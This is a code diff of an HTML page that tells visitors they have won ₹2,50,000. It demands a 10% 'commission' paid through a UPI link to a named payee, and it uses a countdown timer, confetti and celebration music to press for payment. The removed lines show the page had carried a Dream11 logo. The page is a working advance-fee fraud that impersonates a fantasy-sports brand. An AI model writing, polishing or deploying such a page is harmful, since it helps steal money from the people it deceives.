@@ -8,23 +8,17 @@
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      background: #e90606;
+      background: #f4f4f4;
       margin: 0;
       padding: 50px;
-      color: white;
     }
     .container {
       background: white;
-      color: black;
       padding: 30px;
       border-radius: 10px;
       max-width: 500px;
       margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    }
-    .logo {
-      width: 120px;
-      margin-bottom: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     .amount {
       font-size: 28px;
@@ -38,7 +32,7 @@
     }
     #countdown {
       font-size: 20px;
-      color: red;
+      color: #ff0000;
       margin: 10px 0;
     }
     .btn {
@@ -59,36 +53,31 @@
   </style>
 </head>
 <body>
-
   <div class="container">
-    <img src="logo.png" alt="Dream11 Logo" class="logo">
     <h1>Congratulations!</h1>
     <div class="amount">Your Withdrawal Amount: ₹2,50,000</div>
-    <div class="note">To withdraw, pay 10% commission (₹10,000)</div>
+    <div class="note">To withdraw, pay 10% commission</div>
     <div id="countdown"></div>
     <a id="withdrawBtn" href="#" class="btn">Withdraw Now</a>
     <div id="expiredMsg" class="expired" style="display: none;">Link Expired</div>
   </div>
 
+  <!-- Confetti Canvas -->
   <canvas id="confetti-canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>
 
-  <!-- Celebration Sound -->
-  <audio id="celebration-sound" autoplay>
-    <source src="sounds/celebration.mp3" type="audio/mpeg">
-  </audio>
-
+  <!-- Confetti + Music -->
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <script>
-    // Confetti burst on load
+    // Confetti burst
     confetti({ particleCount: 200, spread: 90, origin: { y: 0.6 } });
 
-    // Sound on load
-    window.addEventListener('DOMContentLoaded', () => {
-      const audio = document.getElementById('celebration-sound');
-      audio.play().catch(e => console.log("Autoplay blocked:", e));
-    });
+    // Celebration music
+    const audio = new Audio('sounds/celebrate.mp3');
+    audio.volume = 0.8;
+    audio.play().catch(err => console.log('Auto-play blocked:', err));
+    setTimeout(() => audio.pause(), 3000); // Stop after 3 seconds
 
-    // Countdown logic
+    // Countdown + Button Logic
     const countdownEl = document.getElementById("countdown");
     const withdrawBtn = document.getElementById("withdrawBtn");
     const expiredMsg = document.getElementById("expiredMsg");
@@ -125,9 +114,8 @@
     updateCountdown();
     setInterval(updateCountdown, 1000);
 
-    // UPI redirect
-    withdrawBtn.href = "upi://pay?pa=6005973034@ybl&pn=Ram%20Choudhary&am=10000&cu=INR";
+    // Payment redirect
+    withdrawBtn.href = "upi://pay?pa=6005973034@ybl&pn=ramchoudhary&am=10000&cu=INR";
   </script>
-
 </body>
 </html>
